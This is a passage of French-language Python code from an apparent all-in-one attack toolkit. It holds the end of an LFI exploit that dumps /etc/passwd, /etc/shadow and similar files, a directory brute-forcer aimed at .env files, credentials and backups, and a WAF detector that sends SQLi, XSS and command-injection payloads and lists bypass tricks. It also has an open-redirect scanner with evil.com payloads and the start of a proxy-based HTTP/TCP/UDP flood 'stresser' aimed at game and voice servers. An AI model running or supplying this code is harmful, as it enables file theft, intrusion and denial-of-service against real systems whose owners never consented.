            print(f"{YELLOW}[?]{RESET} {name} — possible (a valider avec POST)")
        elif status == 200 and body and len(body) > 100:
            print(f"{YELLOW}[?]{RESET} {name} — 200 OK ({len(body)} bytes)")

    if not wrapper_working and not findings:
        print(f"\n{RED}[!] Aucune methode LFI n'a fonctionne.{RESET}")
        print(f"{GRAY}  Causes possibles : WAF, filtre strict, chemin relatif different.{RESET}")
        pause()
        return

    print(f"\n{CYAN}   ETAPE 3 — DUMP DES FICHIERS{RESET}\n")

    dumped = {}

    if findings:
        for f in findings:
            target = f["target"]
            payload = (f["prefix"] * f["depth"]) + target.lstrip("/\\")
            status, body, _ = inject(payload)
            if body:
                dumped[target] = body
                print(f"{GREEN}[+]{RESET} {target} — {len(body)} bytes")

    if working_prefix and working_target:
        print(f"\n{YELLOW}[*] Dump des fichiers interessants avec le prefix '{working_prefix}'...{RESET}\n")

        if working_target in ("/etc/passwd", "/etc/shadow"):
            platform_name = "linux"
        else:
            platform_name = "windows"

        extra_targets = LFI_TARGETS.get(platform_name, [])
        for t in extra_targets:
            if t in dumped:
                continue
            t_resolved = t.replace("{user}", "www-data")
            payload = (working_prefix * 6) + t_resolved.lstrip("/\\")
            status, body, _ = inject(payload)
            if body and _lfi_looks_like_content(body, t_resolved):
                dumped[t_resolved] = body
                print(f"{GREEN}[+]{RESET} {t_resolved} — {len(body)} bytes")

    print(f"\n\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   LFI EXPLOIT — {url}{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    print(f"{GREEN}{BOLD}   FICHIERS LUS ({len(dumped)}){RESET}\n")
    for path, body in dumped.items():
        print(f"{CYAN}[+]{RESET} {WHITE}{path}{RESET} — {GRAY}{len(body)} bytes{RESET}")

    if wrapper_working:
        print(f"\n{GREEN}[+] Wrapper fonctionnel : {wrapper_working[0]}{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "LFIExploit"
        out_dir.mkdir(parents=True, exist_ok=True)
        host = urllib.parse.urlparse(url).hostname or "target"
        safe_host = re.sub(r"[^\w\-.]", "_", host)[:40]
        ts = int(time.time())

        for path, body in dumped.items():
            safe_name = re.sub(r"[^\w\-.]", "_", path.lstrip("/\\"))[:60]
            fpath = out_dir / f"{safe_host}_{safe_name}_{ts}.txt"
            with open(fpath, "w", encoding="utf-8", errors="ignore") as f:
                f.write(body)

        report = out_dir / f"lfi_report_{safe_host}_{ts}.txt"
        with open(report, "w", encoding="utf-8") as f:
            f.write(f"LFI Exploit Report\n")
            f.write(f"Target  : {url}\n")
            f.write(f"Param   : {param}\n")
            f.write(f"Date    : {datetime.now().isoformat()}\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"[FICHIERS LUS] ({len(dumped)})\n")
            for path, body in dumped.items():
                f.write(f"\n--- {path} ({len(body)} bytes) ---\n")
                f.write(body[:5000])
                f.write("\n")

        print(f"\n{GREEN}[+] Dossier : {out_dir}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    pause()

# ============================================================
#              OPTION 25 — DIRECTORY BRUTEFORCE
# ============================================================

DIR_WORDLIST = [
    "admin", "administrator", "admin1", "admin2", "adminarea", "adminpanel",
    "admin_area", "administration", "adm", "manager", "management", "moderator",
    "admin_login", "login", "signin", "signup", "register", "auth", "oauth",
    "sso", "account", "accounts", "user", "users", "profile", "profiles",
    "api", "api/v1", "api/v2", "api/v3", "api/internal", "api/private",
    "api/admin", "api/users", "api/auth", "api/login", "api/docs", "api/swagger",
    "rest", "graphql", "graphiql", "rpc", "jsonrpc", "soap", "ws", "websocket",
    "webhook", "webhooks", "callback", "callbacks",
    ".env", ".env.local", ".env.prod", ".env.production", ".env.dev",
    ".env.backup", ".env.old", ".env.save", "config", "config.php",
    "config.json", "config.yml", "config.yaml", "config.xml", "config.ini",
    "configuration", "settings", "settings.php", "settings.json",
    "wp-config.php", "wp-config.php.bak", "app.config", "web.config",
    "credentials", "credentials.txt", "secrets", "secrets.txt", "passwords",
    "passwords.txt", "keys", "keys.txt", "token", "tokens",
    ".git", ".git/HEAD", ".git/config", ".gitignore", ".gitattributes",
    ".svn", ".svn/entries", ".hg", ".hg/hgrc", ".bzr",
    "backup", "backup.zip", "backup.tar.gz", "backup.tar", "backup.rar",
    "backup.sql", "backup.bak", "backup.old", "backups", "bak", "old",
    "dump.sql", "database.sql", "db.sql", "db.sqlite", "database.db",
    "site.zip", "site.tar.gz", "www.zip", "html.zip", "public.zip",
    "archive.zip", "archives",
    "upload", "uploads", "uploaded", "files", "file", "download", "downloads",
    "media", "images", "img", "img_upload", "attachments", "docs", "documents",
    "static", "assets", "public", "private", "tmp", "temp", "cache",
    "wp-admin", "wp-login.php", "wp-content", "wp-includes", "wp-json",
    "wordpress", "joomla", "administrator", "drupal", "typo3", "magento",
    "prestashop", "shopify", "laravel", "symfony", "django", "flask",
    "phpmyadmin", "pma", "adminer.php", "mysql", "sqladmin", "myadmin",
    "cpanel", "whm", "plesk", "webmail", "roundcube", "squirrelmail",
    "grafana", "kibana", "prometheus", "jenkins", "jira", "confluence",
    "gitlab", "github", "gitea", "gogs", "bitbucket", "travis", "drone",
    "sonar", "nexus", "artifactory", "portainer", "rancher", "k8s",
    "phpinfo.php", "info.php", "test.php", "debug", "debug.php", "status",
    "health", "healthz", "metrics", "server-status", "server-info",
    "swagger", "swagger-ui", "swagger.json", "openapi.json", "api-docs",
    "robots.txt", "sitemap.xml", "sitemap", "readme", "readme.md",
    "readme.txt", "README.md", "CHANGELOG", "CHANGELOG.txt", "VERSION",
    "LICENSE", "INSTALL", "INSTALL.txt",
    "dev", "devel", "development", "test", "tests", "testing", "staging",
    "stage", "preprod", "prod", "production", "demo", "sandbox", "beta",
    "alpha", "internal", "intranet", "private", "secured", "old", "new",
    "v1", "v2", "v3", "backup_old", "copy", "backup_2023", "backup_2024",
]

def _check_dir(base_url, path, timeout, follow_redirects=False):
    if requests is None:
        return None
    url = base_url.rstrip("/") + "/" + path.lstrip("/")
    try:
        r = requests.get(
            url,
            headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
            timeout=timeout,
            allow_redirects=follow_redirects,
            verify=False,
            stream=True,
        )
        size = 0
        try:
            chunk = next(r.iter_content(2048), b"")
            size = len(chunk)
        except Exception:
            size = len(r.content or b"") if hasattr(r, "content") else 0
        r.close()
        return (path, r.status_code, size, r.headers.get("Content-Type", "")[:40])
    except Exception:
        return None

def option_25():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    print(f"\n{CYAN}   [ DIRECTORY BRUTEFORCE ]{RESET}\n")

    url = input(f"{YELLOW}[?]{RESET} URL cible (ex: https://site.com) {RED}->{RESET} ").strip()
    if not url:
        print(f"{RED}[!] URL vide.{RESET}")
        pause()
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip("/")

    print(f"{YELLOW}[*] Test de connexion...{RESET}")
    try:
        r = requests.get(url, headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
                         timeout=8, verify=False)
        print(f"{GREEN}[+] HTTP {r.status_code} — {len(r.content)} bytes{RESET}")
    except Exception as e:
        print(f"{RED}[!] Connexion impossible : {e}{RESET}")
        pause()
        return

    print(f"\n{CYAN}   WORDLIST{RESET}\n")
    print(f"  {PINK}(1){RESET} Wordlist interne ({len(DIR_WORDLIST)} chemins)")
    print(f"  {PINK}(2){RESET} Wordlist custom")
    print()

    wl_choice = input(f"{YELLOW}[?]{RESET} Choix (1-2, def 1) {RED}->{RESET} ").strip() or "1"

    if wl_choice == "2":
        wl_path = input(f"{YELLOW}[?]{RESET} Chemin wordlist {RED}->{RESET} ").strip()
        if not wl_path or not os.path.isfile(wl_path):
            print(f"{RED}[!] Fichier introuvable.{RESET}")
            pause()
            return
        try:
            with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
                wordlist = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
            print(f"{GREEN}[+] {len(wordlist)} chemins charges{RESET}")
        except Exception as e:
            print(f"{RED}[!] Lecture impossible : {e}{RESET}")
            pause()
            return
    else:
        wordlist = DIR_WORDLIST

    print(f"\n{CYAN}   OPTIONS{RESET}\n")
    try:
        th = int(input(f"{YELLOW}[?]{RESET} Threads (def 30) {RED}->{RESET} ").strip() or "30")
        th = max(1, min(200, th))
    except ValueError:
        th = 30

    try:
        to = float(input(f"{YELLOW}[?]{RESET} Timeout (def 6s) {RED}->{RESET} ").strip() or "6")
        to = max(1, min(60, to))
    except ValueError:
        to = 6

    print(f"\n{CYAN}   FILTRAGE{RESET}\n")
    print(f"  {PINK}(1){RESET} Tout afficher (200, 301, 302, 401, 403)")
    print(f"  {PINK}(2){RESET} Seulement 200 + 301 + 302")
    print()

    filt = input(f"{YELLOW}[?]{RESET} Choix (1-2, def 1) {RED}->{RESET} ").strip() or "1"
    keep_all = (filt == "1")

    print(f"\n{CYAN}   RESUME{RESET}")
    print(f"  {GREEN}Cible    : {WHITE}{url}{RESET}")
    print(f"  {GREEN}Wordlist : {WHITE}{len(wordlist)} entrees{RESET}")
    print(f"  {GREEN}Threads  : {WHITE}{th}{RESET}")
    print(f"  {GREEN}Timeout  : {WHITE}{to}s{RESET}")
    print()

    confirm = input(f"{YELLOW}[?]{RESET} Lancer ? (y/n) {RED}->{RESET} ").strip().lower()
    if confirm not in ("y", "yes", "o", "oui"):
        print(f"{YELLOW}[!] Annule.{RESET}")
        pause()
        return

    print(f"\n{CYAN}[*] Bruteforce sur {len(wordlist)} chemins...{RESET}\n")

    results = []
    done = [0]
    total = len(wordlist)
    lock = threading.Lock()
    start_time = time.time()

    import concurrent.futures

    def worker(path):
        res = _check_dir(url, path, to)
        with lock:
            done[0] += 1
            if res:
                p, status, size, ct = res
                if status in (200, 301, 302, 401, 403):
                    if keep_all or status in (200, 301, 302):
                        results.append(res)
                        color = GREEN if status == 200 else (YELLOW if status in (301, 302) else PINK)
                        sys.stdout.write(
                            f"\r{' ' * 100}\r"
                            f"{color}[{status}]{RESET} "
                            f"{WHITE}{'/' + p:<45}{RESET} "
                            f"{GRAY}{size:>6}b {ct[:25]}{RESET}\n"
                        )
                        sys.stdout.flush()

            ratio = done[0] / total
            bar_len = 30
            filled = int(bar_len * ratio)
            bar = "█" * filled + "░" * (bar_len - filled)
            pct = int(ratio * 100)
            sys.stdout.write(
                f"\r{' ' * 100}\r"
                f"{PURPLE}[{bar}]{RESET} {WHITE}{pct:3d}%{RESET}  "
                f"{GRAY}{done[0]}/{total}{RESET}  "
                f"{CYAN}found:{len(results)}{RESET}"
            )
            sys.stdout.flush()

    with concurrent.futures.ThreadPoolExecutor(max_workers=th) as ex:
        list(ex.map(worker, wordlist))

    elapsed = time.time() - start_time

    print(f"\n\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   DIRECTORY SCAN — {url}{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    if results:
        results.sort(key=lambda x: (x[1], x[0]))
        print(f"{GREEN}{BOLD}   RESULTATS ({len(results)}){RESET}\n")
        for path, status, size, ct in results:
            color = GREEN if status == 200 else (YELLOW if status in (301, 302) else PINK)
            print(f"  {color}[{status}]{RESET} "
                  f"{WHITE}/{path:<45}{RESET} "
                  f"{GRAY}{size:>6}b {ct[:25]}{RESET}")
    else:
        print(f"{YELLOW}   Aucun chemin trouve.{RESET}")

    print(f"\n{CYAN}   STATS{RESET}")
    print(f"  {GREEN}Trouves  : {WHITE}{len(results)}{RESET}")
    print(f"  {GREEN}Testes   : {WHITE}{total}{RESET}")
    print(f"  {GREEN}Duree    : {WHITE}{elapsed:.2f}s{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "DirBrute"
        out_dir.mkdir(parents=True, exist_ok=True)
        host = urllib.parse.urlparse(url).hostname or "target"
        safe_host = re.sub(r"[^\w\-.]", "_", host)[:40]
        out_file = out_dir / f"dirs_{safe_host}_{int(time.time())}.txt"

        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Directory Bruteforce — {url}\n")
            f.write(f"Date : {datetime.now().isoformat()}\n")
            f.write(f"Total : {len(results)}\n")
            f.write("=" * 60 + "\n\n")
            for path, status, size, ct in results:
                f.write(f"[{status}] /{path:<45} {size}b {ct}\n")

        print(f"\n{GREEN}[+] Rapport : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    pause()

# ============================================================
#              OPTION 26 — WAF DETECTOR
# ============================================================

WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id", "__cfduid"],
        "server": ["cloudflare"],
        "cookies": ["__cfduid", "__cf_bm", "cf_clearance"],
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "server": ["sucuri"],
        "cookies": ["sucuri_cloudproxy"],
    },
    "Akamai": {
        "headers": ["x-akamai-transformed", "x-akamai-request-id", "akamai-origin-hop"],
        "server": ["akamai", "ghost"],
        "cookies": ["ak_bmsc", "bm_sv", "akamai"],
    },
    "Imperva Incapsula": {
        "headers": ["x-iinfo", "x-cdn"],
        "server": ["incapsula"],
        "cookies": ["incap_ses", "visid_incap", "nlbi"],
    },
    "F5 BIG-IP ASM": {
        "headers": ["x-wa-info"],
        "server": ["big-ip", "bigip", "f5"],
        "cookies": ["ts", "bigipserver", "f5"],
    },
    "AWS WAF / CloudFront": {
        "headers": ["x-amz-cf-id", "x-amz-cf-pop", "x-amzn-requestid"],
        "server": ["cloudfront", "awselb"],
        "cookies": ["awsalb", "awsalbcors"],
    },
    "Fastly": {
        "headers": ["x-fastly-request-id", "fastly-io-info", "x-served-by"],
        "server": ["fastly", "varnish"],
        "cookies": [],
    },
    "Barracuda": {
        "headers": ["barra_counter_session"],
        "server": ["barracuda"],
        "cookies": ["barra_counter_session"],
    },
    "Citrix NetScaler": {
        "headers": ["x-citrix-transaction-id", "via"],
        "server": ["netscaler", "citrix"],
        "cookies": ["citrix_ns_id", "ns_af", "nsc_"],
    },
    "Fortinet FortiWeb": {
        "headers": ["fortiwafsid"],
        "server": ["fortiweb", "forti"],
        "cookies": ["fortiwafsid"],
    },
    "ModSecurity": {
        "headers": ["x-mod-security"],
        "server": ["mod_security", "modsecurity", "nginx"],
        "cookies": [],
    },
    "Wordfence": {
        "headers": [],
        "server": [],
        "cookies": ["wfvt_", "wordfence_verifiedhuman"],
    },
    "Google Cloud Armor": {
        "headers": ["x-cloud-trace-context"],
        "server": ["gse", "google"],
        "cookies": [],
    },
    "StackPath": {
        "headers": ["x-sp-cache", "x-sp-url"],
        "server": ["stackpath"],
        "cookies": [],
    },
    "Varnish": {
        "headers": ["x-varnish", "via"],
        "server": ["varnish"],
        "cookies": [],
    },
    "Nginx (proxy)": {
        "headers": [],
        "server": ["nginx"],
        "cookies": [],
    },
    "HAProxy": {
        "headers": [],
        "server": ["haproxy"],
        "cookies": [],
    },
    "Traefik": {
        "headers": [],
        "server": ["traefik"],
        "cookies": [],
    },
    "Envoy": {
        "headers": [],
        "server": ["envoy"],
        "cookies": [],
    },
}

def option_26():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    print(f"\n{CYAN}   [ WAF DETECTOR ]{RESET}\n")

    url = input(f"{YELLOW}[?]{RESET} URL cible {RED}->{RESET} ").strip()
    if not url:
        print(f"{RED}[!] URL vide.{RESET}")
        pause()
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip("/")

    print(f"{YELLOW}[*] Analyse WAF...{RESET}\n")

    detected = []
    evidence = {}

    try:
        r = requests.get(url, headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
                         timeout=10, verify=False)
        headers = {k.lower(): v for k, v in r.headers.items()}
        server = headers.get("server", "").lower()
        set_cookie = "; ".join(r.cookies.keys()).lower() if r.cookies else ""
        body_lower = (r.text or "").lower()[:5000]
    except Exception as e:
        print(f"{RED}[!] Connexion impossible : {e}{RESET}")
        pause()
        return

    print(f"{GREEN}[+] HTTP {r.status_code}{RESET}")
    print(f"{GRAY}    Server     : {headers.get('server', 'n/a')}{RESET}")
    print(f"{GRAY}    Via        : {headers.get('via', 'n/a')}{RESET}")
    print(f"{GRAY}    X-Cache    : {headers.get('x-cache', 'n/a')}{RESET}")
    if r.cookies:
        print(f"{GRAY}    Cookies    : {', '.join(r.cookies.keys())}{RESET}")
    print()

    for waf_name, sigs in WAF_SIGNATURES.items():
        matched = False
        found_signals = []

        for h in sigs["headers"]:
            if h in headers:
                matched = True
                found_signals.append(f"header '{h}: {headers[h][:50]}'")

        for s in sigs["server"]:
            if s in server:
                matched = True
                found_signals.append(f"server '{headers.get('server')}'")

        for c in sigs["cookies"]:
            if c in set_cookie:
                matched = True
                found_signals.append(f"cookie '{c}'")

        if waf_name.lower() in body_lower:
            matched = True
            found_signals.append("nom dans la page")

        if matched:
            detected.append(waf_name)
            evidence[waf_name] = found_signals

    print(f"{YELLOW}[*] Test actif (envoi d'un payload suspect)...{RESET}\n")

    test_payloads = [
        ("SQLi", url + "/?id=1' OR '1'='1"),
        ("XSS", url + "/?q=<script>alert(1)</script>"),
        ("LFI", url + "/?file=../../../../etc/passwd"),
        ("RCE", url + "/?cmd=;cat /etc/passwd"),
    ]

    try:
        r_base = requests.get(url, headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
                              timeout=10, verify=False)
        base_status = r_base.status_code
    except Exception:
        base_status = 200

    waf_block_responses = 0
    for name, payload_url in test_payloads:
        try:
            rt = requests.get(payload_url,
                              headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
                              timeout=10, verify=False)
            if rt.status_code in (403, 406, 419, 429, 501, 503) and rt.status_code != base_status:
                print(f"{PINK}[!]{RESET} {name:<8} — bloque (HTTP {rt.status_code})")
                waf_block_responses += 1
            elif rt.status_code == base_status:
                print(f"{GRAY}[-]{RESET} {name:<8} — non bloque (HTTP {rt.status_code})")
            else:
                print(f"{YELLOW}[?]{RESET} {name:<8} — reponse {rt.status_code}")
        except requests.exceptions.ConnectionError:
            print(f"{YELLOW}[?]{RESET} {name:<8} — connexion coupee (peut = WAF)")
            waf_block_responses += 1
        except Exception as e:
            print(f"{GRAY}[-]{RESET} {name:<8} — {str(e)[:40]}")

    print(f"\n\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   WAF DETECTION — {url}{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    if detected:
        print(f"{PINK}{BOLD}   WAF DETECTE ({len(detected)}){RESET}\n")
        for waf in detected:
            print(f"{PINK}[+]{RESET} {WHITE}{BOLD}{waf}{RESET}")
            for ev in evidence[waf]:
                print(f"    {GRAY}└─ {ev}{RESET}")
            print()
    else:
        print(f"{GREEN}   Aucun WAF identifie.{RESET}\n")

    print(f"{CYAN}   COMPORTEMENT{RESET}")
    if waf_block_responses >= 2:
        print(f"  {PINK}[!]{RESET} {waf_block_responses}/4 payloads bloques — WAF actif")
    elif waf_block_responses == 1:
        print(f"  {YELLOW}[?]{RESET} 1 payload bloque — WAF possiblement present")
    else:
        print(f"  {GREEN}[+]{RESET} Aucun payload bloque — pas de WAF actif ou tres permissif")

    print(f"\n{CYAN}   VERDICT{RESET}")
    if detected:
        print(f"  {PINK}WAF present : {', '.join(detected)}{RESET}")
        print(f"  {GRAY}→ Pour bypasser : encodages, case mixing, chunked transfer, time-based blind.{RESET}")
    else:
        print(f"  {GREEN}Aucun WAF detecte — scan direct possible.{RESET}")

    pause()

# ============================================================
#              OPTION 27 — OPEN REDIRECT
# ============================================================

REDIRECT_PARAMS = [
    "redirect", "redirect_url", "redirect_uri", "redirect_to",
    "url", "uri", "link", "goto", "target", "dest", "destination",
    "next", "continue", "return", "return_to", "returnurl", "return_url",
    "callback", "callbackurl", "callback_url",
    "forward", "forward_url", "out", "view", "ref", "ref_url", "reference",
    "site", "location", "go", "jump", "redir", "redirection", "checkout_url",
    "image_url", "file", "filename", "load", "page", "r", "u",
]

REDIRECT_PAYLOADS = [
    "//evil.com", "https://evil.com", "http://evil.com", "https:evil.com",
    "//evil.com/%2f..", "/\\evil.com", "https://target.com@evil.com",
    "https://evil.com#target.com", "https://evil.com?target.com", "////evil.com",
    "https:\\\\evil.com", "/%09/evil.com", "/%2f%2fevil.com", "https://google.com",
]

def option_27():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    print(f"\n{CYAN}   [ OPEN REDIRECT ]{RESET}\n")

    url = input(f"{YELLOW}[?]{RESET} URL cible {RED}->{RESET} ").strip()
    if not url:
        print(f"{RED}[!] URL vide.{RESET}")
        pause()
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    print(f"\n{CYAN}   MODE{RESET}\n")
    print(f"  {PINK}(1){RESET} Tester un parametre connu")
    print(f"  {PINK}(2){RESET} Scanner tous les params communs")
    print(f"  {PINK}(3){RESET} Payload custom sur un param")
    print()

    mode = input(f"{YELLOW}[?]{RESET} Choix (1-3, def 2) {RED}->{RESET} ").strip() or "2"

    try:
        to = float(input(f"{YELLOW}[?]{RESET} Timeout (def 6s) {RED}->{RESET} ").strip() or "6")
    except ValueError:
        to = 6

    def test_param(param_name, payload):
        parsed2 = urllib.parse.urlparse(url)
        qs2 = urllib.parse.parse_qs(parsed2.query, keep_blank_values=True)
        qs2[param_name] = [payload]
        new_q = urllib.parse.urlencode(qs2, doseq=True)
        test_url = urllib.parse.urlunparse(parsed2._replace(query=new_q))
        try:
            r = requests.get(test_url,
                             headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
                             timeout=to, verify=False, allow_redirects=False)
            location = r.headers.get("Location", "")
            return (r.status_code, location, test_url)
        except Exception:
            return (None, "", test_url)

    if mode == "1":
        if qs:
            print(f"{GREEN}[+] Params existants : {', '.join(qs.keys())}{RESET}")
            pname = input(f"{YELLOW}[?]{RESET} Parametre a tester {RED}->{RESET} ").strip()
        else:
            pname = input(f"{YELLOW}[?]{RESET} Parametre a tester {RED}->{RESET} ").strip()
        if not pname:
            print(f"{RED}[!] Parametre requis.{RESET}")
            pause()
            return
        params_to_test = [pname]
    elif mode == "3":
        pname = input(f"{YELLOW}[?]{RESET} Parametre a tester {RED}->{RESET} ").strip()
        if not pname:
            print(f"{RED}[!] Parametre requis.{RESET}")
            pause()
            return
        params_to_test = [pname]
        custom = input(f"{YELLOW}[?]{RESET} Payload custom {RED}->{RESET} ").strip()
        if custom:
            REDIRECT_PAYLOADS.insert(0, custom)
    else:
        params_to_test = list(set(REDIRECT_PARAMS + list(qs.keys())))
        print(f"{YELLOW}[*] Test de {len(params_to_test)} parametres...{RESET}\n")

    findings = []

    for pname in params_to_test:
        for payload in REDIRECT_PAYLOADS:
            status, location, test_url = test_param(pname, payload)
            if status is None:
                continue

            if status in (301, 302, 303, 307, 308):
                if "evil.com" in location or payload.rstrip("/") in location or "google.com" in location:
                    findings.append({
                        "param": pname,
                        "payload": payload,
                        "status": status,
                        "location": location,
                        "url": test_url,
                    })
                    print(f"{GREEN}[+]{RESET} {pname:<20} {status} -> {location[:80]}")
                    break

            elif status == 200:
                try:
                    r = requests.get(test_url, timeout=to, verify=False,
                                     allow_redirects=False)
                    body = r.text or ""
                    if f"location" in body.lower() and ("evil.com" in body or "google.com" in body):
                        findings.append({
                            "param": pname,
                            "payload": payload,
                            "status": status,
                            "location": "in-body (JS/meta)",
                            "url": test_url,
                        })
                        print(f"{GREEN}[+]{RESET} {pname:<20} 200 -> redirect JS/meta detecte")
                        break
                except Exception:
                    pass

    print(f"\n\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   OPEN REDIRECT — {url}{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    if findings:
        print(f"{PINK}{BOLD}   PARAMETRES VULNERABLES ({len(findings)}){RESET}\n")
        for f in findings:
            print(f"{PINK}[+]{RESET} {WHITE}{f['param']}{RESET}")
            print(f"    {GRAY}Payload  : {f['payload']}{RESET}")
            print(f"    {GRAY}Status   : {f['status']}{RESET}")
            print(f"    {GRAY}Location : {f['location'][:100]}{RESET}")
            print(f"    {GRAY}URL      : {f['url'][:120]}{RESET}")
            print()
    else:
        print(f"{GREEN}   Aucun open redirect detecte.{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "OpenRedirect"
        out_dir.mkdir(parents=True, exist_ok=True)
        host = urllib.parse.urlparse(url).hostname or "target"
        safe_host = re.sub(r"[^\w\-.]", "_", host)[:40]
        out_file = out_dir / f"redirect_{safe_host}_{int(time.time())}.txt"

        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Open Redirect Scan — {url}\n")
            f.write(f"Date : {datetime.now().isoformat()}\n")
            f.write("=" * 60 + "\n\n")
            for r_ in findings:
                f.write(f"[VULN] {r_['param']}\n")
                f.write(f"  Payload  : {r_['payload']}\n")
                f.write(f"  Status   : {r_['status']}\n")
                f.write(f"  Location : {r_['location']}\n")
                f.write(f"  URL      : {r_['url']}\n\n")

        print(f"\n{GREEN}[+] Rapport : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    pause()

# ============================================================
#              OPTION 28 — IP STRESSER (PROXY FLOOD)
# ============================================================

def option_28():
    clear()
    banner()
    if not _need_requests() or aiohttp is None:
        if aiohttp is None:
            print(f"{RED}[!] Module 'aiohttp' manquant. pip install aiohttp{RESET}")
        pause()
        return

    print(f"\n{CYAN}   [ IP STRESSER — PROXY FLOOD ]{RESET}\n")
    print(f"{GRAY}  Sature une cible avec un flux massif via proxies.{RESET}\n")

    # --- Cible ---
    target_ip = input(f"{YELLOW}[?]{RESET} IP cible (ex: 192.168.1.10) -> ").strip()
    if not target_ip:
        print(f"{RED}[!] IP vide.{RESET}")
        pause()
        return

    try:
        target_port = int(input(f"{YELLOW}[?]{RESET} Port cible (ex: 80, 25565, 50000+) -> ").strip() or "80")
        if not (1 <= target_port <= 65535):
            raise ValueError
    except ValueError:
        print(f"{RED}[!] Port invalide.{RESET}")
        pause()
        return
        
    # --- TYPE D'ATTAQUE ---
    print(f"\n{CYAN}   TYPE D'ATTAQUE{RESET}\n")
    print(f"  {PINK}(1){RESET} HTTP Flood (Site web, port 80/443)")
    print(f"  {PINK}(2){RESET} TCP Flood (Serveur de jeu, Minecraft...)")
    print(f"  {PINK}(3){RESET} UDP Flood (Vocale Discord, FiveM, jeux...)")
    print()
    
    atk_type = input(f"{YELLOW}[?]{RESET} Choix (1-3, def 3) -> ").strip() or "3"
    
    target_url = None
    if atk_type == "1":
        target_url = f"http://{target_ip}:{target_port}/"
    elif atk_type == "2":
        target_url = None # On fera du raw TCP dans send_request
    elif atk_type == "3":
        target_url = "UDP" # Flag pour le mode UDP

    try:
        num_requests = int(input(f"{YELLOW}[?]{RESET} Nombre de paquets/requetes (ex: 100000) -> ").strip())
        if num_requests <= 0:
            raise ValueError
    except ValueError:
        print(f"{RED}[!] Nombre invalide.{RESET}")
        pause()
        return

    try:
        threads = int(input(f"{YELLOW}[?]{RESET} Threads max (def 200) -> ").strip() or "200")
        threads = max(1, min(1000, threads))
    except ValueError:
        threads = 200

    print(f"\n{YELLOW}[*] Chargement des user agents...{RESET}")
    UA_GIST_URL = "https://gist.githubusercontent.com/eteubert/1dd9692d4dfa2548fbfb550782daa95e/raw/user_agents.csv"

    def load_user_agents():
        try:
            r = requests.get(UA_GIST_URL, timeout=15)
            r.raise_for_status()
            return [ua.strip() for ua in r.text.splitlines() if ua.strip()]
        except Exception:
            return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"]

    user_agents = load_user_agents()
    print(f"{GREEN}[+] {len(user_agents)} user agents charges{RESET}")

    # Sources de proxies (On privilégie SOCKS5 pour l'UDP)
    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
